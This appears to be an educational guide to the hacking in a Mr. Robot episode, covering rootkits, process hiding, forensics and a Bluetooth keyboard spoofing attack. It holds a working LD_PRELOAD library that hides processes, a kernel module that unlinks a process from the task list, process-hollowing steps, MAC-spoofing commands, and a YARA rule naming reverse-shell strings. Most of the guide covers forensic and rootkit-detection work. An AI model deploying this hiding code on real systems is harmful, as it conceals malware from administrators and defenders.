# Season 2, Episode 10: eps2.8_h1dden-pr0cess.axx

## Episode Overview

The episode title references hidden processes -- techniques used to conceal running software from system administrators, security tools, and forensic investigators. In Unix/Linux, a process is an instance of a running program; hiding a process means making it invisible to tools like `ps`, `top`, and `ls`. This episode deals with the aftermath of the FBI hack and the exploitation of the data obtained. The hidden process metaphor extends to the characters themselves, many of whom are operating covertly within larger organizations. Digital forensics becomes relevant as both fsociety and the FBI attempt to understand what happened and what was compromised.

---

## Hacks & Techniques

### 1. Hidden Process Techniques

Hiding processes from detection is a fundamental capability of rootkits and advanced malware. There are several levels at which processes can be concealed, ranging from simple tricks to deep kernel manipulation.

**User-Space Process Hiding:**

**LD_PRELOAD Hijacking:**

The `LD_PRELOAD` environment variable tells the Linux dynamic linker to load a specified shared library before all others. By preloading a malicious library that intercepts system calls, an attacker can hide processes from user-space tools.

```c
// malicious_preload.c -- Intercepts readdir() to hide processes
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>

// Name of the process to hide
#define HIDDEN_PROCESS "malware"

// Original readdir function pointer
static struct dirent* (*original_readdir)(DIR*) = NULL;

struct dirent* readdir(DIR* dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent* entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        // Skip entries matching the hidden process name
        if (strstr(entry->d_name, HIDDEN_PROCESS) == NULL) {
            return entry;
        }
    }
    return NULL;
}
```

```bash
# Compile the malicious shared library
gcc -shared -fPIC -o libhide.so malicious_preload.c -ldl

# Set LD_PRELOAD to hide the process
export LD_PRELOAD=/path/to/libhide.so

# Now 'ps', 'ls /proc', and other tools using readdir()
# will not show the hidden process
```

**Limitations of LD_PRELOAD hiding:**
- Only affects dynamically linked programs
- Static binaries (like BusyBox) are not affected
- The preload library itself can be detected via `/proc/[pid]/maps`
- Forensic tools that read `/proc` directly can bypass this

**Kernel-Space Process Hiding:**

**Direct Kernel Object Manipulation (DKOM):**

DKOM involves directly modifying kernel data structures to hide processes. In Linux, all processes are tracked in a doubly-linked list. By unlinking a process from this list, it becomes invisible to all user-space tools.

```
Normal process list:
[init] <-> [sshd] <-> [malware] <-> [bash] <-> [ps]

After DKOM (unlinking malware):
[init] <-> [sshd] <-> [bash] <-> [ps]
                       ^                ^
                       |                |
               [malware] (still running, but invisible)
```

**How DKOM Works in Linux:**

```c
// Conceptual DKOM rootkit (kernel module)
// WARNING: This is for educational purposes only

#include <linux/module.h>
#include <linux/sched.h>
#include <linux/pid.h>

static int target_pid = 0;
module_param(target_pid, int, 0);

static int __init hide_init(void) {
    struct task_struct *task;
    struct pid *pid_struct;

    pid_struct = find_vpid(target_pid);
    if (!pid_struct) return -ESRCH;

    task = pid_task(pid_struct, PIDTYPE_PID);
    if (!task) return -ESRCH;

    // Unlink process from the task list
    list_del(&task->tasks);

    // Hide from /proc by removing from PID hash
    // (Additional manipulation needed for complete hiding)

    printk(KERN_INFO "Process %d hidden\n", target_pid);
    return 0;
}
```

**Process Hollowing (Windows):**

Process hollowing is a technique primarily used on Windows where a legitimate process is created in a suspended state, its memory is replaced with malicious code, and then it is resumed. The malicious code runs under the identity of the legitimate process.

```
Step 1: Create legitimate process (e.g., svchost.exe) in SUSPENDED state
Step 2: Unmap the original executable from process memory
Step 3: Allocate new memory in the process
Step 4: Write malicious code into the new memory
Step 5: Set the entry point to the malicious code
Step 6: Resume the process

Result: The process appears as 'svchost.exe' in Task Manager
        but is actually running malicious code
```

**Additional Hiding Techniques:**

| Technique | Level | Description |
|---|---|---|
| Process name spoofing | User-space | Changing `argv[0]` to mimic legitimate processes |
| Mount namespace hiding | User-space | Using Linux namespaces to isolate the process view |
| /proc filesystem manipulation | Kernel | Modifying the /proc virtual filesystem |
| Syscall hooking | Kernel | Intercepting system calls to filter process listings |
| Hypervisor-based hiding | Below kernel | Running malware below the OS in a hypervisor |
| Firmware rootkits | Below kernel | Hiding in UEFI/BIOS firmware |

### 2. FBI Hack Aftermath and Data Exploitation

Following the successful femtocell + Rubber Ducky hack in Episode 8, fsociety now has:

- **FBI case files**: Documents detailing the investigation into the 5/9 hack
- **Agent communications**: Intercepted phone calls and SMS from the femtocell
- **Network access**: Potential persistent backdoor on the FBI network
- **Surveillance intelligence**: Knowledge of which fsociety members the FBI is investigating and what evidence they have

**Intelligence Processing:**

The stolen data must be processed, analyzed, and acted upon:

1. **Data triage**: Quickly identify the most critical documents
2. **Threat assessment**: Determine which fsociety members are at risk
3. **Operational adjustment**: Modify plans based on what the FBI knows
4. **Counter-intelligence**: Use knowledge of FBI methods to avoid detection
5. **Selective disclosure**: Decide what intelligence to share with allies (Dark Army)

### 3. Digital Forensics: Network Forensics

When the FBI discovers (or suspects) the breach, they will conduct a forensic investigation. Network forensics involves analyzing network traffic and logs to reconstruct the attack.

**Network Forensics Process:**

```
1. Detection
   └── IDS/IPS alerts, anomalous traffic patterns, user reports

2. Containment
   └── Isolate affected systems, preserve evidence

3. Collection
   ├── Network traffic captures (pcap files)
   ├── Firewall logs
   ├── Proxy logs
   ├── DNS query logs
   ├── DHCP logs
   ├── NetFlow/sFlow data
   └── Endpoint logs (Windows Event Logs, syslog)

4. Analysis
   ├── Timeline reconstruction
   ├── Communication pattern analysis
   ├── Payload extraction and analysis
   ├── Indicator of Compromise (IoC) identification
   └── Attribution (when possible)

5. Reporting
   └── Formal incident report with findings and recommendations
```

**Key Network Forensics Tools:**

```bash
# Analyze pcap files for suspicious traffic
tshark -r capture.pcap -Y "http.request or dns.qr == 0" \
  -T fields -e frame.time -e ip.src -e ip.dst -e http.host -e dns.qry.name

# Extract files from network capture
foremost -i capture.pcap -o extracted_files/

# Identify beaconing behavior (C2 communication)
tshark -r capture.pcap -Y "ip.dst == [C2_IP]" \
  -T fields -e frame.time -e tcp.len | sort

# Analyze DNS queries for data exfiltration
tshark -r capture.pcap -Y "dns.qry.type == 1" \
  -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# Network flow analysis
nfdump -R /var/nfdump/ -o extended \
  "proto tcp and dst port 443 and bytes > 1000000"
```

### 4. Malware Reverse Engineering

If the FBI discovers the PowerShell payload left by the Rubber Ducky, forensic analysts will reverse engineer it.

**Reverse Engineering Process:**

```bash
# 1. Acquire the malware sample safely
# Copy from quarantine or forensic image
cp /evidence/malware_sample.ps1 /analysis/sandbox/

# 2. Static analysis -- examine without executing
# Decode base64-encoded PowerShell
echo "encoded_payload" | base64 -d

# Deobfuscate PowerShell
# Many attackers use layers of encoding:
powershell -c "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('...'))"

# 3. Behavioral analysis -- execute in sandboxed environment
# Use tools like:
# - ANY.RUN (interactive sandbox)
# - Cuckoo Sandbox (automated analysis)
# - Joe Sandbox
# - VMware/VirtualBox isolated environment

# 4. Extract Indicators of Compromise (IoCs)
# - C2 server IP addresses/domains
# - File hashes (MD5, SHA1, SHA256)
# - Mutex names
# - Registry keys modified
# - Network signatures (YARA rules)
```

**YARA Rule for Detection:**

```yara
rule fsociety_powershell_payload {
    meta:
        description = "Detects fsociety PowerShell reverse shell"
        author = "FBI Cyber Division"
        date = "2015"
    strings:
        $s1 = "TCPClient" ascii
        $s2 = "GetStream" ascii
        $s3 = "ReadAllBytes" ascii
        $s4 = "-w hidden" ascii
        $s5 = "-ep bypass" ascii
        $s6 = "DownloadString" ascii
    condition:
        4 of ($s*)
}
```

### 5. Chain of Custody for Digital Evidence

Any evidence collected during the forensic investigation must maintain a strict chain of custody to be admissible in court.

**Chain of Custody Requirements:**

1. **Documentation**: Every piece of evidence is logged with:
   - Date and time of collection
   - Who collected it
   - Where it was collected
   - How it was stored
   - Every person who handled it

2. **Integrity verification**: Cryptographic hashes are computed for all evidence
   ```bash
   # Hash evidence files
   sha256sum evidence_image.dd > evidence_image.dd.sha256
   md5sum evidence_image.dd > evidence_image.dd.md5

   # Verify integrity at any point
   sha256sum -c evidence_image.dd.sha256
   ```

3. **Write-blocking**: Original storage media is accessed through hardware write-blockers to prevent accidental modification

4. **Forensic imaging**: Bit-for-bit copies (forensic images) are made, and all analysis is performed on the copies, never the originals

```bash
# Create forensic image with dc3dd (enhanced dd)
dc3dd if=/dev/sda of=evidence.dd hash=sha256 log=imaging.log

# Or with standard dd and separate hashing
dd if=/dev/sda of=evidence.dd bs=4096 conv=noerror,sync
sha256sum evidence.dd > evidence.dd.sha256

# Mount forensic image read-only for analysis
mount -o ro,loop,noexec evidence.dd /mnt/evidence/
```

5. **Secure storage**: Evidence stored in locked, access-controlled facilities with environmental controls

### 6. Bluetooth Keyboard Spoofing (Prison)

While in prison, Elliot scans for wireless signals using his phone and detects a correctional officer's Bluetooth keyboard connected to a laptop in a nearby patrol car. He exploits the Bluetooth connection using a chain of specialized tools:

- **BlueSniff** -- used to discover the Bluetooth keyboard and identify its MAC address through passive scanning
- **btScanner** -- used to enumerate the Bluetooth device details, including device class, manufacturer, and services
- **Spooftooph** -- a Kali Linux tool used to spoof Bluetooth device identity. Elliot clones the MAC address of the officer's keyboard, tricking the laptop into thinking his phone is the keyboard

Once connected, Elliot types arbitrary commands on the officer's laptop, gaining access to the prison network as if he were sitting at the keyboard himself.

**Attack Flow:**

```
1. Passive scan: Discover Bluetooth keyboard (BlueSniff)
2. Enumerate: Get device details and MAC address (btScanner)
3. Spoof: Clone keyboard's Bluetooth identity (Spooftooph)
4. Pair: Officer's laptop accepts spoofed device as the keyboard
5. Inject: Send arbitrary keystrokes to the laptop remotely
```

**Commands Used:**

```bash
# Discover Bluetooth devices
hcitool scan
# or use BlueSniff for passive discovery

# Enumerate device info
btscanner

# Spoof Bluetooth MAC address to clone keyboard identity
spooftooph -i hci0 -a [officer_keyboard_MAC]

# Once paired, inject keystrokes remotely
```

**Why This Works:**

Bluetooth keyboards (especially older models) often use minimal authentication. The pairing process relies heavily on the MAC address as a device identifier. By spoofing the MAC address of the legitimate keyboard, Elliot's device presents itself as the already-trusted keyboard. The laptop, having previously paired with that MAC address, accepts the connection without re-authentication -- a fundamental weakness in Bluetooth's trust model.

### 7. Pwn Phone

Elliot uses a **Pwnie Express Pwn Phone** -- a smartphone loaded with over 100 penetration testing tools, similar to having Kali Linux in your pocket. It can audit wired, wireless, and Bluetooth networks while looking like a regular Android smartphone. Elliot describes it as "a dream device for a pentester."

**Pwn Phone Capabilities:**

- **Wireless auditing**: Wi-Fi scanning, WEP/WPA cracking, rogue AP creation
- **Bluetooth attacks**: Device discovery, spoofing, and exploitation (as used in the keyboard attack)
- **Network reconnaissance**: Port scanning, service enumeration, vulnerability scanning
- **Man-in-the-middle**: ARP spoofing, SSL stripping, packet capture
- **Reporting**: Built-in tools for documenting findings

The Pwn Phone is significant because it allows all of these attack capabilities to be carried inconspicuously. In a prison environment, a smartphone is far less suspicious than a laptop, and its built-in wireless radios provide the hardware needed for Bluetooth and Wi-Fi attacks without any additional adapters.

---

## Tools Used

| Tool | Purpose |
|---|---|
| **Volatility** | Memory forensics framework |
| **Autopsy / Sleuth Kit** | Disk forensics and file recovery |
| **Wireshark / tshark** | Network traffic analysis |
| **YARA** | Malware pattern matching and classification |
| **Cuckoo Sandbox** | Automated malware analysis |
| **dc3dd** | Forensic disk imaging |
| **FTK (Forensic Toolkit)** | Commercial forensic analysis suite |
| **EnCase** | Commercial forensic analysis platform |
| **chkrootkit / rkhunter** | Rootkit detection tools |

---

## Commands Shown

**Rootkit Detection:**

```bash
# Check for common rootkits
sudo chkrootkit

# Alternative rootkit scanner
sudo rkhunter --check --skip-keypress

# Check for hidden processes by comparing /proc with ps output
ls /proc | grep -E '^[0-9]+$' | sort -n > proc_list.txt
ps -eo pid --no-headers | sort -n > ps_list.txt
diff proc_list.txt ps_list.txt
# Any PIDs in proc_list but not ps_list may be hidden processes

# Check for LD_PRELOAD hijacking
cat /etc/ld.so.preload
env | grep LD_PRELOAD
for pid in /proc/[0-9]*/; do
    cat ${pid}environ 2>/dev/null | tr '\0' '\n' | grep LD_PRELOAD
done

# Check for kernel module rootkits
lsmod | head -20
cat /proc/modules
# Compare the two -- discrepancies indicate hidden modules

# Check for syscall table modifications
# (Requires reading /proc/kallsyms or System.map)
cat /proc/kallsyms | grep sys_call_table
```

**Memory Forensics with Volatility:**

```bash
# Analyze a memory dump for hidden processes
volatility -f memory.dump --profile=LinuxDebian9x64 linux_pslist
volatility -f memory.dump --profile=LinuxDebian9x64 linux_psaux
volatility -f memory.dump --profile=LinuxDebian9x64 linux_pstree

# Compare different process listing methods to find hidden processes
volatility -f memory.dump --profile=LinuxDebian9x64 linux_psxview

# Check for rootkit hooks
volatility -f memory.dump --profile=LinuxDebian9x64 linux_check_syscall
volatility -f memory.dump --profile=LinuxDebian9x64 linux_check_modules

# Extract network connections
volatility -f memory.dump --profile=LinuxDebian9x64 linux_netstat

# For Windows memory dumps
volatility -f memory.dump --profile=Win10x64 pslist
volatility -f memory.dump --profile=Win10x64 psscan
volatility -f memory.dump --profile=Win10x64 psxview
volatility -f memory.dump --profile=Win10x64 malfind
```

**Incident Response Timeline:**

```bash
# Create a timeline of file system activity
fls -r -m "/" /dev/sda1 > body.txt
mactime -b body.txt -d > timeline.csv

# Search for recently modified files
find /mnt/evidence -type f -mtime -7 -ls

# Check authentication logs
grep -E "Failed|Accepted|session opened" /var/log/auth.log

# Check for scheduled tasks (persistence mechanisms)
crontab -l
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
systemctl list-timers
```

---

## Real-World Parallels

### Rootkits in the Wild

- **Sony BMG Rootkit (2005)**: Sony included a rootkit (XCP) on audio CDs that installed hidden software on Windows computers to enforce DRM. It used techniques similar to those described above to hide from the user, and it created security vulnerabilities that malware authors subsequently exploited.

- **Stuxnet (2010)**: The Stuxnet worm used a rootkit component to hide its presence on infected Windows systems. It hooked system calls to filter directory listings and hide its files, and it used a signed driver to operate at kernel level.

- **Hacking Team's RCS (Remote Control System)**: The surveillance software sold by the Italian firm Hacking Team included sophisticated rootkit capabilities for hiding on target systems. When Hacking Team was itself hacked in 2015, the tools were leaked publicly.

- **Azazel rootkit**: A modern open-source userland rootkit that uses LD_PRELOAD to hide processes, files, network connections, and users. Demonstrates that effective hiding does not necessarily require kernel access.

### Digital Forensics in Law Enforcement

- **FBI Regional Computer Forensics Laboratory (RCFL)**: The FBI operates a network of computer forensics labs across the United States, processing thousands of cases annually. They follow strict chain-of-custody procedures like those described above.

- **Encase and FTK**: The two dominant commercial forensic tools used by law enforcement worldwide. Examiners are certified in these tools, and their output is widely accepted in court proceedings.

- **NIST Computer Forensics Tool Testing (CFTT)**: NIST tests and validates forensic tools to ensure they produce reliable results, supporting the admissibility of digital evidence in legal proceedings.

### Process Hollowing in Modern Malware

- **Emotet**: One of the most prolific malware families, Emotet has used process hollowing to inject its payload into legitimate Windows processes like `svchost.exe` and `explorer.exe`.

- **TrickBot**: Another major malware family that uses process hollowing as part of its evasion strategy.

- **Cobalt Strike**: The popular commercial (and frequently pirated) penetration testing tool uses process hollowing as one of its primary evasion techniques. It is now one of the most common tools observed in real-world intrusions.

### FBI Cyber Investigation Capabilities

- **FBI Cyber Division**: The FBI maintains a dedicated Cyber Division with agents trained in digital forensics, network intrusion investigation, and cybercrime prosecution.

- **National Cyber Investigative Joint Task Force (NCIJTF)**: A multi-agency task force that coordinates cyber threat investigations across US government agencies.

- **The real-world irony**: The show depicts the FBI being hacked by the very group they are investigating. In reality, government agencies have been breached multiple times -- the OPM (Office of Personnel Management) breach in 2015 exposed personal data of 21.5 million government employees and contractors, and various other agencies have suffered intrusions.

---

## Tool Links

| Tool | Link |
|---|---|
| Volatility | https://www.volatilityfoundation.org/ |
| Autopsy | https://www.autopsy.com/ |
| Sleuth Kit | https://www.sleuthkit.org/ |
| Wireshark | https://www.wireshark.org/ |
| YARA | https://virustotal.github.io/yara/ |
| Cuckoo Sandbox | https://cuckoosandbox.org/ |
| ANY.RUN | https://any.run/ |
| chkrootkit | http://www.chkrootkit.org/ |
| rkhunter | https://rkhunter.sourceforge.net/ |
| dc3dd | https://sourceforge.net/projects/dc3dd/ |
| FTK Imager | https://www.exterro.com/ftk-imager |
| EnCase | https://www.opentext.com/products/encase-forensic |
| Cobalt Strike | https://www.cobaltstrike.com/ |
| Spooftooph | https://github.com/spooftooph/spooftooph |
| BlueZ | http://www.bluez.org/ |

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Rootkit for hiding processes | T1014 | Rootkit | https://attack.mitre.org/techniques/T1014/ |
| Hide artifacts (hidden processes) | T1564 | Hide Artifacts | https://attack.mitre.org/techniques/T1564/ |
| Process hollowing (process injection) | T1055 | Process Injection | https://attack.mitre.org/techniques/T1055/ |
| Local system data collection | T1005 | Data from Local System | https://attack.mitre.org/techniques/T1005/ |
| Exfiltration via C2 channel | T1041 | Exfiltration Over C2 Channel | https://attack.mitre.org/techniques/T1041/ |
| Indicator removal (anti-forensics) | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| Impair defenses (disable security) | T1562 | Impair Defenses | https://attack.mitre.org/techniques/T1562/ |
| Sandbox/virtualization evasion | T1497 | Virtualization/Sandbox Evasion | https://attack.mitre.org/techniques/T1497/ |
| Bluetooth keyboard spoofing | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |

---

## References and Further Reading

- **Sony BMG Rootkit Scandal (2005)**: Analysis of the XCP rootkit that Sony distributed on music CDs, leading to class action lawsuits and FTC action.
- **Stuxnet Rootkit Component**: Symantec's W32.Stuxnet Dossier documenting the rootkit's kernel-level hiding techniques.
- **CVE-2015-2291** (Hacking Team kernel exploit): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2291
- **SANS Institute - Digital Forensics and Incident Response**: https://www.sans.org/white-papers/ - Papers on forensic methodology, chain of custody, and rootkit detection.
- **DEF CON - Rootkit Detection Techniques**: Presentations on detecting DKOM, syscall hooking, and LD_PRELOAD-based rootkits.
- **OPM Data Breach (2015)**: Analysis of the breach that exposed 21.5 million government personnel records.
- **NIST SP 800-86 - Guide to Integrating Forensic Techniques into Incident Response**: https://csrc.nist.gov/publications/detail/sp/800-86/final

---

## Search Tags

```
tags: [rootkit, hidden-process, dkom, ld-preload, process-hollowing, forensics, volatility, autopsy, sleuth-kit, yara, cuckoo-sandbox, chkrootkit, rkhunter, dc3dd, encase, ftk, cobalt-strike, incident-response, Bluetooth, BlueSniff, btScanner, Spooftooph, Pwn-Phone, keyboard-spoofing]
season: 2
episode: 10
mitre: [T1014, T1564, T1055, T1005, T1041, T1070, T1562, T1497, T1200]
```
